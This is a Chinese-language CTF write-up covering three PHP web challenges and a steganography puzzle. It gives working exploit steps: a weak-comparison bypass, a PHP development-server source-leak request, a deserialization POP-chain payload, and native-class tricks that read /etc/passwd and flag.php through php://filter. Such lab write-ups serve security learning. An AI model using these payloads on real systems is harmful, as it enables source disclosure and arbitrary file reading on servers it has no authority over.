[TOC]



## web

### babyPHP 

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

$num = $_GET['num'];

if (preg_match("/\'|\"|\`| |<|>|?|\^|%|\$/", $num)) {
           die("nononno");
}

if (eval("return ${num} != 2;") && $num == 0 && is_numeric($num) != true) {
 system('cat flag.php');
} else {
 echo '2';
}
```

仔细读题，主要考察php弱类型比较，我们可以直接传字母就行：

```
http://43.138.65.13:2025/?num=a
```





### funnyPHP 

我们访问的路径为：

```
http://47.104.14.160:3344/hint.php
```

![image-20230305132410885](https://s2.loli.net/2023/03/05/nymwrgbYCXhIaKv.png)



当我们访问`根目录`时：

<img src="https://s2.loli.net/2023/03/05/c95LENASj8RmWJb.png" alt="image-20230305132555645" style="zoom:33%;" />

可以判断这里为： php Development Server 启动的服务

![image-20230305132904876](https://s2.loli.net/2023/03/05/hNvOJdPoV1rnbj4.png)



查询得知，这里考察的是 **PHP<=7.4.21 Development Server源码泄露漏洞**

```php
GET /puzzle.php HTTP/1.1 
Host: pd.research
\r\n
\r\n
GET / HTTP/1.1
\r\n
\r\n
```

当我们以如上方式发送数据包时，我们可以获得 puzzle.php 的源码：

![image-20230305133507277](https://s2.loli.net/2023/03/05/TZ1LxfcuOzhP5ak.png)



使用bp时要注意，我们要把 自动填充 content-length关闭掉

![image-20230305133431311](https://s2.loli.net/2023/03/05/rT5OUJQpFfaGsbk.png)



源码如下：

```php
<?php
error_reporting(0);

class A{
    public $sdpc = ["welcome" => "yeah, something hidden."];

    function __call($name, $arguments)
    {
        $this->$name[$name]();
    }

}


class B{
    public $a;

    function __construct()
    {
        $this->a = new A();
    }

    function __toString()
    {
        echo $this->a->sdpc["welcome"]; //对大家表示欢迎
    }

}

class C{
    public $b;
    protected $c;

    function __construct(){
        $this->c = new B();
    }

    function __destruct(){
        $this->b ? $this->c->sdpc('welcom') : 'welcome!'.$this->c; //变着法欢迎大家
    }
}

class Evil{
    function getflag() {
        echo file_get_contents('/fl4g');
    }
}


if(isset($_POST['sdpc'])) {
    unserialize($_POST['sdpc']);
} else {
    serialize(new C());
}


?>
```

这是一个反序列化漏洞，我们可以如下构造：

```php
<?php
error_reporting(0);

class A
{
    public $sdpc;

    function __construct() {
        $this->sdpc = array("sdpc" => array(new Evil(),'getflag'));
    }//注意修改$sdpc的值为一个数组 
    //array('sdpc'=>array(new Evil(),'getflag'))

    function __call($name, $arguments)
    {

        $name[$name]();
    }
}


class B
{
    public $a;

    function __construct()
    {
        $this->a = new A();
    }

    function __toString()
    {
        echo $this->a->sdpc["welcome"]; //对大家表示欢迎
    }
}

class C
{
    public $b;
    protected $c;

    function __construct()
    {
        $this->c = new A(); //注意修改为创建A类对象
    }

    function __destruct()
    {
        $this->b ? $this->c->sdpc('welcom') : 'welcome!' . $this->c; //给b赋值 ，触发 ___call
    }
}

class Evil
{
    function getflag()
    {
        echo '1';
        file_get_contents('/fl4g');
    }
}

$ca = new A();
$cb = new B();
$cc = new C();

$cc->b = 'sp4c1ous';


echo urlencode(serialize($cc));
```

payload:

```
sdpc=O%3A1%3A%22C%22%3A2%3A%7Bs%3A1%3A%22b%22%3Bs%3A8%3A%22sp4c1ous%22%3Bs%3A4%3A%22%00%2A%00c%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22sdpc%22%3Ba%3A1%3A%7Bs%3A4%3A%22sdpc%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A4%3A%22Evil%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22getflag%22%3B%7D%7D%7D%7D
```



这里有一个点：

```php
<?php
class Evil
{
    function getflag()
    {
        echo '1';

    }
}
print_r(array(new Evil(),'getflag')());
//输出： 1
```

**`array(new Evil(),'getflag')()`** 

这样子相当于 Evil对象eval调用它的getflag()方法： `eval::getflag()`

这里不是很懂



### Ezphp 

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$g = $_GET['g'];
$t = $_GET['t'];
echo new $g($t); 
```

这个地方直接要我们创建对象，但是又没有自定义类，所以我们应该寻找**php原生类**

最初我想到的是 `Error`、`Exception`类，但是没什么用，可以用来执行xss漏洞

然后我找到了如下几个类：

#### **遍历文件目录的类**

- DirectoryIterator 
- FilesystemIterator 
- GlobIterator 

##### 1、DirectoryIterator：

会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 `__toString()` 方法，输出指定目录里面经过排序之后的第一个文件名

我们可以配合`glob协议` 模式匹配来寻找我们想要的文件路径：

```
http://43.138.65.13:2023/?g=DirectoryIterator&t=glob:///var/www/h*
//回显：html
```

我们想要得到路径下所有的文件、目录，需要遍历输出：

```php
$a = new DirectoryIterator("glob:///*");
foreach($a as $f){
	echo($f->__toString().'<br>');
}
```



##### 2、FilesystemIterator:

和上面差不多：

```php
$a = new FilesystemIterator("glob:///*");
foreach($a as $f){
	echo($f->__toString().'<br>');
}
```



##### 3、**Globlterator**

与前两个类的作用相似，GlobIterator 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。

`在这个类中不需要配合glob伪协议，可以直接使用` 传参直接给路径就行



#### 读取文件内容的类：

##### SplFileObject 

(PHP 5 >= 5.1.2, PHP 7, PHP 8)

> SplFileInfo 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作。

SplFileObject继承自 SplFileInfo

<img src="https://s2.loli.net/2023/03/05/gRaV2DpnGAE8kt4.png" alt="image-20230305141449069" style="zoom:33%;" />



```
http://43.138.65.13:2023/?g=SplFileObject&t=/etc/passwd
```

读取到了 `/etc/passwd` 内容

这里我们可以`结合php伪协议`:

```php
http://43.138.65.13:2023/?g=SplFileObject&t=php://filter/convert.base64-encode/resource=flag.php
```

![image-20230305141633305](https://s2.loli.net/2023/03/05/QOrRblBYezcmoMs.png)

成功读取flag

[相关文章](https://zhuanlan.zhihu.com/p/458866772)





## Misc

### 套娃

<img src="https://s2.loli.net/2023/03/05/SIeU8ZkpHEAYXsv.png" alt="image-20230305143100126" style="zoom:33%;" />

解压密码在最底下

![image-20230305143139692](https://s2.loli.net/2023/03/05/pEw1aGB5kl97LnR.png)

打开txt文件，`ZjRrM19rM3k=` base64解密是一个假的key

我们滑倒txt文件最底下：

![image-20230305143356892](https://s2.loli.net/2023/03/05/w2uULElTmOpXsHg.png)

有一大堆不可见的东西，在记事本打开：

![image-20230305143335614](https://s2.loli.net/2023/03/05/qPi71olDCFpaI4t.png)

发现没有什么，这因该是`零宽字符`

[零宽字符解密](https://www.mzy0.com/ctftools/zerowidth1/)

<img src="https://s2.loli.net/2023/03/05/zZkKMhLjeyrfaxm.png" alt="image-20230305143503869" style="zoom:33%;" />

`XzFzX0U0NXk=` 解密得到key：`_1s_E45y`



然后我们观察一下图片，猜测是 `lsb隐写`

<img src="https://s2.loli.net/2023/03/05/IunqNe9Spv6DhXi.png" alt="image-20230305144102200" style="zoom:33%;" />

但是 `stegsolve` 得到一串不知道什么得东西，我们猜测这是加密的lsb隐写，

我们可以使用 `lsb隐写脚本`: **cloacked-pixel**

结合之前我们得到的key，我们解密：

```python
python2 lsb.py extract encode.png flag.txt _1s_E45y
```

![image-20230305144553874](https://s2.loli.net/2023/03/05/EhGy6nVgcB2feYI.png)

得到flag









